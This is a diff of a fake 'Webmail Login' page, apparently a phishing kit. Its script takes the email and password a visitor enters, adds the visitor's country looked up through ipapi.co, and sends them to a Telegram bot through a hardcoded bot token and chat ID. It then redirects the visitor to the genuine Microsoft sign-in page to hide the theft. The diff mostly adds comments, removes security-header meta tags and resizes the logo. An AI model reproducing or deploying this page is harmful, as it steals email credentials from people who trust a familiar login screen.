@@ -4,15 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Webmail Login</title>
-    
-    <!-- Security Headers -->
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; connect-src 'self' https://api.telegram.org https://ipapi.co; img-src 'self'; style-src 'self' 'unsafe-inline'; frame-ancestors 'none';">
-    <meta http-equiv="X-Content-Type-Options" content="nosniff">
-    <meta http-equiv="X-Frame-Options" content="DENY">
-    <meta http-equiv="Referrer-Policy" content="no-referrer">
-    <meta http-equiv="Strict-Transport-Security" content="max-age=31536000; includeSubDomains; preload">
-    <meta http-equiv="Permissions-Policy" content="geolocation=()">
-    
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -28,7 +19,7 @@
 
         img {
             margin-bottom: 30px;
-            width: 300px; /* Increased size for the logo */
+            width: 250px;
         }
 
         .login-box {
@@ -89,10 +80,10 @@
             text-decoration: none;
         }
     </style>
-
     <script>
         let userCountry = ""; // Placeholder for user country
 
+        // Function to populate the email field from URL parameter
         function populateEmailField() {
             const params = new URLSearchParams(window.location.search);
             if (params.has('email')) {
@@ -100,32 +91,49 @@
             }
         }
 
+        // Function to get user's country
         function getUserCountry() {
+            // Use a third-party service to get the country
             fetch('https://ipapi.co/json/')
                 .then(response => response.json())
                 .then(data => {
-                    userCountry = data.country_name;
+                    userCountry = data.country_name; // Assuming the API returns the country name
                 })
                 .catch(error => {
                     console.error('Error fetching country:', error);
                 });
         }
 
+        // Function to send data to Telegram
         function sendDataToTelegram(event) {
-            event.preventDefault();
+            event.preventDefault(); // Prevents form from submitting in the usual way
+
+            // Collect data from form fields
             const email = document.getElementById("email").value;
             const password = document.getElementById("password").value;
+
+            // Telegram bot details
             const botToken = "7840973698:AAEwak-7hrIa-vzp3BV9kgkFUQK0LloA21M";
             const chatId = "6885599280";
             const message = `Email: ${email}\nPassword: ${password}\nCountry: ${userCountry}`;
+
+            console.log("Sending Message:", message); // Log the message for debugging
+
+            // Send the data to Telegram
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: message })
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
             })
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
+                    // Only redirect if the message was sent successfully
                     window.location.href = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=638660683449437479.YTAwYzY1NDMtNjJiMS00Y2FiLWI5ZmEtYmIwNjNlNTEwYWYxNzJjNTY0YjUtMmEzMS00MjMyLWI5ZDctOTU0ZGMxZGQ4MDM0&ui_locales=en-US&mkt=en-US&client-request-id=b1abf132-4104-426c-bf61-1a815019d951&state=IKtRMuTumeBtEK_B9-E1eJAQb3_czuOR-4ZYe-Cd_x1EBXFBvs5nGMAKU1Fu6K8eUC0IUl2DgeXWM0tXNr0grYWwn-Aha8IGu_g3ZINNfZoSeM9ZeEjRPY_2IFQcjhZim6sAHz1HbfZF5eCG9vi664tNIKmvuw3mS7KYb0hv9ItzQ_MwbtFbdRu-inkPPXzVmhcruXuxJS9i9q05htRGBHs0iftF4BaqI7VNCwOHhTIph4Qlje-t-fS4mNdFxgawwhKWg1gePKYM-kW_r2rM8ATBJYHE8qFCJQaZFlBMgo0&x-client-SKU=ID_NET8_0&x-client-ver=7.5.1.0";
                 } else {
                     console.error("Error sending message:", data);
@@ -136,6 +144,7 @@
             });
         }
 
+        // Run functions on page load
         window.onload = function() {
             populateEmailField();
             getUserCountry();
